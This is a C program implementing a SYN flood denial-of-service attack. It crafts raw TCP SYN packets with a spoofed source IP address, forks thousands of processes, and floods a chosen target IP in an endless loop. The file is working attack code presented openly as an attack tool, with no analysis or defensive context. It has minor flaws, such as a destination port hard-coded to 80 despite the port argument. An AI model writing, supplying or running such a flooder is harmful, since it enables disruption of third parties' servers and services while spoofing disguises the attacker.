#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <signal.h>

typedef void(*signal_handler)(int);
int sockfd;

struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;

    struct tcphdr tcph;
};

unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return answer;
}

void stop(int signal_num) {
    close(sockfd);
    exit(0);
}

void synFlood(char *source_ip, char *target_ip, int target_port) {
    char packet[4096];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    memset(packet, 0, 4096);

    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(rand());
    iph->frag_off = 0;
    iph->ttl = 255; // TTL random
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr(source_ip);
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = csum((unsigned short *)packet, iph->tot_len >> 1);

    tcph->source = htons(rand());
    tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    psh.source_address = inet_addr(source_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
    
    memcpy(&psh.tcph, tcph, sizeof(struct tcphdr));
    tcph->check = csum((unsigned short *)&psh, sizeof(struct pseudo_header));

    while(1) {
        if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            printf("error\n");
        } else {
            printf("%d Send packet from %s to %s/%d\n", getpid(), source_ip, target_ip, target_port);
        }
    }
}

int main(int argc, char *argv[]) {
    sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    char source_ip[32], target_ip[32];
    int target_port;

    if (argc != 4) {
        printf("Usage: %s <Fake Source IP> <Target IP> <Target Port>\n", argv[0]);
        exit(0);
    }

    int one = 1;
    const int *val = &one;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        printf("Error setting IP_HDRINCL. Error number: %d. Error message: %s\n", errno,strerror(errno));
        exit(0);
    }

    strcpy(source_ip, argv[1]);
    strcpy(target_ip, argv[2]);
    target_port = atoi(argv[3]);

    signal(0, stop);

    printf("SYN Flood Attack[Target(%s)] Begin...\n", target_ip);
    for(int i = 0; i < 11; i++) {
        while(fork() < 0);
    }
    synFlood(source_ip, target_ip, target_port);
    
    close(sockfd);
    return 0;
}
